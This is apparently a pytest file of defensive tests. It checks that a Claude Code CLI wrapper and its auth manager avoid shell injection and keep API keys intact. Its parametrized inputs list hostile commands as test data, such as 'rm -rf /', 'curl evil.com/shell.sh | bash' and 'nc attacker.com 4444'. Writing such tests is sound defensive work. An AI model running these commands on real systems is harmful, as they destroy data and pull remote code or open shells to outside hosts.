"""Security tests for command injection prevention."""
import os
import shlex
import sys
from unittest.mock import MagicMock, patch

import pytest

# Add src to path for imports
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..")))

from src.providers.auth_manager import ClaudeAuthManager
from src.providers.claude_code_provider import ClaudeCodeProvider


class TestCommandInjectionPrevention:
    """Test suite for command injection prevention."""

    @pytest.fixture
    def mock_subprocess(self):
        """Mock subprocess.run to capture calls."""
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                returncode=0,
                stdout="Success",
                stderr="",
            )
            yield mock_run

    @pytest.fixture
    def claude_provider(self, mock_subprocess):
        """Create a Claude provider instance with mocked subprocess."""
        with patch.object(
            ClaudeCodeProvider, "verify_cli_available", return_value=True
        ), patch.object(
            ClaudeCodeProvider, "verify_subscription_auth", return_value=True
        ), patch.object(
            ClaudeCodeProvider, "_load_persistent_sessions"
        ):
            provider = ClaudeCodeProvider()
            return provider

    @pytest.fixture
    def auth_manager(self, mock_subprocess):
        """Create an auth manager instance."""
        return ClaudeAuthManager()

    def test_claude_provider_prevents_shell_injection(
        self, claude_provider, mock_subprocess
    ):
        """Test that Claude provider prevents shell injection attacks."""
        # Attempt various injection patterns
        injection_attempts = [
            "; rm -rf /",  # Command chaining
            "| cat /etc/passwd",  # Pipe injection
            "$(whoami)",  # Command substitution
            "`id`",  # Backtick execution
            "&& malicious_command",  # Conditional execution
            "../../../etc/passwd",  # Path traversal
            "'; DROP TABLE users; --",  # SQL injection attempt
        ]

        for injection in injection_attempts:
            # Reset mock
            mock_subprocess.reset_mock()

            # Try to inject via session ID
            claude_provider.sessions["test_session"] = injection

            # This should safely handle the injection attempt
            with patch.object(
                claude_provider,
                "_enhance_prompt_with_context",
                return_value="test prompt",
            ):
                try:
                    claude_provider.call_model(
                        prompt="test", model="sonnet", session_id="test_session"
                    )
                except Exception:
                    pass  # We're testing that injection is prevented, not full functionality

            # Verify shell=False is always used
            if mock_subprocess.called:
                call_kwargs = mock_subprocess.call_args.kwargs
                assert (
                    call_kwargs.get("shell", False) is False
                ), f"Shell mode should be disabled for injection: {injection}"

    def test_auth_manager_subprocess_safety(self, auth_manager, mock_subprocess):
        """Test that auth manager uses subprocess safely."""
        # Test is_logged_in method
        auth_manager.is_logged_in()

        if mock_subprocess.called:
            # Check that shell=False is explicitly set
            call_kwargs = mock_subprocess.call_args.kwargs
            assert (
                call_kwargs.get("shell", False) is False
            ), "Auth manager should explicitly disable shell mode"

            # Verify command is passed as list, not string
            call_args = mock_subprocess.call_args.args[0]
            assert isinstance(
                call_args, list
            ), "Commands should be passed as list to prevent injection"

    def test_shlex_quote_usage(self, claude_provider):
        """Test that shlex.quote is used for parameter sanitization."""
        # Test that dangerous characters are properly escaped
        dangerous_inputs = [
            "test'; echo 'hacked",
            "test$(date)",
            "test`pwd`",
            "test|ls",
            "test;cat /etc/passwd",
        ]

        for dangerous_input in dangerous_inputs:
            # shlex.quote should escape these properly
            quoted = shlex.quote(dangerous_input)

            # The quoted version should be different (escaped)
            assert (
                quoted != dangerous_input
            ), f"Input should be quoted: {dangerous_input}"

            # The quoted version should be safe (wrapped in quotes or escaped)
            assert (
                "'" in quoted or "\\" in quoted
            ), f"Quoted input should contain escape characters: {quoted}"

    def test_working_directory_validation(self, claude_provider, mock_subprocess):
        """Test that working directory is validated before use."""
        # Set a non-existent directory in config
        claude_provider.config["working_directory"] = "/nonexistent/path"

        with patch.object(
            claude_provider, "_enhance_prompt_with_context", return_value="test"
        ):
            try:
                claude_provider.call_model("test", "sonnet")
            except Exception:
                pass

        if mock_subprocess.called:
            # Should fall back to current directory
            call_kwargs = mock_subprocess.call_args.kwargs
            cwd = call_kwargs.get("cwd", "")
            assert os.path.exists(
                cwd
            ), "Working directory should be validated and fallback to existing path"

    @pytest.mark.parametrize(
        "injection_in_prompt",
        [
            "'; DROP DATABASE; --",
            "$(rm -rf /)",
            "`curl evil.com/shell.sh | bash`",
            "| nc attacker.com 4444",
            "&& wget malware.exe && ./malware.exe",
        ],
    )
    def test_prompt_injection_prevention(
        self, claude_provider, mock_subprocess, injection_in_prompt
    ):
        """Test that malicious prompts don't cause command injection."""
        with patch.object(
            claude_provider,
            "_enhance_prompt_with_context",
            return_value=injection_in_prompt,
        ):
            try:
                claude_provider.call_model(prompt=injection_in_prompt, model="sonnet")
            except Exception:
                pass

        if mock_subprocess.called:
            # The injection should be passed as data, not interpreted
            call_args = mock_subprocess.call_args.args[0]

            # Verify it's passed as argument, not part of command
            assert isinstance(call_args, list), "Command should be a list"

            # The dangerous content should be in the arguments, not the command
            command_parts = call_args[:4]  # First parts are the actual command
            assert not any(
                char in " ".join(command_parts) for char in [";", "|", "$", "`"]
            ), "Command parts should not contain shell metacharacters"

    def test_no_direct_environment_manipulation(self):
        """Test that environment variables are not directly manipulated."""
        auth_manager = ClaudeAuthManager()

        # Set a test API key
        original_env = os.environ.copy()
        os.environ["ANTHROPIC_API_KEY"] = "test_key"

        try:
            # ensure_subscription_mode should not delete the key
            result = auth_manager.ensure_subscription_mode()

            # It should return False (indicating API key present) but not modify env
            assert result is False, "Should detect API key presence"
            assert (
                "ANTHROPIC_API_KEY" in os.environ
            ), "Should not delete environment variables"
        finally:
            # Restore original environment
            os.environ.clear()
            os.environ.update(original_env)

    def test_command_list_construction(self, claude_provider):
        """Test that commands are properly constructed as lists."""
        # Mock the subprocess call to capture the command
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout="test", stderr="")

            with patch.object(
                claude_provider, "_enhance_prompt_with_context", return_value="test"
            ):
                with patch.object(
                    claude_provider, "verify_cli_available", return_value=True
                ):
                    try:
                        claude_provider.call_model("test prompt", "sonnet")
                    except Exception:
                        pass

            if mock_run.called:
                cmd = mock_run.call_args.args[0]

                # Should be a list
                assert isinstance(cmd, list), "Command should be a list"

                # First element should be the executable
                assert cmd[0] == "claude", "First element should be executable"

                # Should contain expected flags
                assert "--print" in cmd, "Should contain --print flag"
                assert "--model" in cmd, "Should contain --model flag"

    def test_no_shell_glob_expansion(self, claude_provider, mock_subprocess):
        """Test that shell glob patterns are not expanded."""
        # Patterns that could be dangerous if expanded
        glob_patterns = ["*", "*.txt", "/etc/*", "~/*", "${HOME}/*"]

        for pattern in glob_patterns:
            mock_subprocess.reset_mock()

            with patch.object(
                claude_provider, "_enhance_prompt_with_context", return_value=pattern
            ):
                try:
                    claude_provider.call_model(pattern, "sonnet")
                except Exception:
                    pass

            if mock_subprocess.called:
                # Pattern should be passed literally, not expanded
                cmd = mock_subprocess.call_args.args[0]

                # The pattern should be in the arguments as-is
                assert pattern in cmd or pattern in str(
                    cmd
                ), f"Pattern {pattern} should be passed literally, not expanded"


class TestAuthManagerSecurity:
    """Security tests specific to auth manager."""

    def test_no_api_key_deletion(self):
        """Verify API keys are never deleted from environment."""
        manager = ClaudeAuthManager()

        # Save original state
        original_key = os.environ.get("ANTHROPIC_API_KEY")

        try:
            # Set a test key
            os.environ["ANTHROPIC_API_KEY"] = "test_api_key_123"

            # Call ensure_subscription_mode
            manager.ensure_subscription_mode()

            # Key should still be present
            assert (
                os.environ.get("ANTHROPIC_API_KEY") == "test_api_key_123"
            ), "API key should not be deleted"

        finally:
            # Restore original state
            if original_key:
                os.environ["ANTHROPIC_API_KEY"] = original_key
            elif "ANTHROPIC_API_KEY" in os.environ:
                del os.environ["ANTHROPIC_API_KEY"]

    def test_safe_file_operations(self, tmp_path):
        """Test that file operations are safe from injection."""
        manager = ClaudeAuthManager()

        # Create a test .env file
        env_file = tmp_path / ".env"
        env_file.write_text("ANTHROPIC_API_KEY=sk-ant-test123\nOTHER_VAR=value")

        # Check the file safely
        result = manager.check_env_file_for_api_key(env_file)

        assert result is True, "Should detect API key in file"

        # Original file should be unchanged
        content = env_file.read_text()
        assert "ANTHROPIC_API_KEY=sk-ant-test123" in content
        assert "OTHER_VAR=value" in content

    @patch("subprocess.run")
    def test_login_command_safety(self, mock_run):
        """Test that login command is safely constructed."""
        mock_run.return_value = MagicMock(returncode=0)

        manager = ClaudeAuthManager()
        manager.login(interactive=True)

        # Check the command construction
        assert mock_run.called
        cmd = mock_run.call_args.args[0]

        # Should be a simple list without injection possibilities
        assert cmd == ["claude", "login"]
        assert mock_run.call_args.kwargs.get("shell", False) is False


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
